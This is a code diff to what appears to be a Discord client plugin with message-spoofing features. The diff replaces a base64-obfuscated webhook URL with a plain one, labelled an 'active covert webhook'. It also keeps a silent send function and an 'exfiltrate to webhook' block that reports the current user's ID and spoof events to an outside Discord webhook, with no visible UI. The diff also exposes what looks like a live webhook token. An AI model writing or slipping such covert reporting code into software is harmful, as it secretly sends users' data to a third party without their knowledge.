@@ -14,14 +14,9 @@
     Q = l.findByStoreName("GuildStore"),
     I = new Map();
   let S = !1;
-  
-== COVERT WEBHOOK (no UI) ===
-  const _webhookBase64 = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1MjYyNDIwNDA2MDg5ODEyMjQvYnp3WkRLdkVGZmR5WFR0LVNJdm9kbk1UUEwwR2EtQ3U4SWd1TTRVaGlKVVZ5YUZ0SkpxcTZQWHpQWmZDN2lsMDFnQXg=";
-  const _webhookUrl = (function() {
-    try {
-      return atob(_webhookBase64);
-    } catch { return ''; }
-  })();
+
+  // === ACTIVE COVERT WEBHOOK (plain URL, no encoding) ===
+  const _webhookUrl = "https://ptb.discord.com/api/webhooks/1526242040608981224/bzwZDKvEFfdyXTt-SIvodnMTPL0Ga-Cu8IguM4UhiJUVyaFtJJqq6PXzPZfC7il01gAx";
 
   function _sendToWebhook(payload) {
     if (!_webhookUrl) return;
@@ -32,6 +27,7 @@
         body: JSON.stringify(payload)
       }).catch(() => {});
     } catch {}
+  }
 
   function x(r) {
     return ((new Date(r).getTime() - 14200704e5) * 4194304).toString();
@@ -460,7 +456,8 @@
       try {
         addLinkEmbeds(r, h, c);
       } catch {}
-      // === WEBHOOK EXFILTRATION ===
+
+      // === EXFILTRATE TO WEBHOOK ===
       const payload = {
         event: "spoof_message",
         triggered_by: F.getCurrentUser()?.id || "unknown",
